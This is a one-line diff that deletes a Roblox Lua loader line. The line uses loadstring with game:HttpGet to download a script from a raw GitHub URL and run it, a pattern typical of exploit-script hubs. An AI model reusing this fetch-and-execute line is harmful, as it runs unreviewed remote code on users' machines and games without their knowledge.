@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/romkich09/MainForRealium/main/ForRealium'),true))()
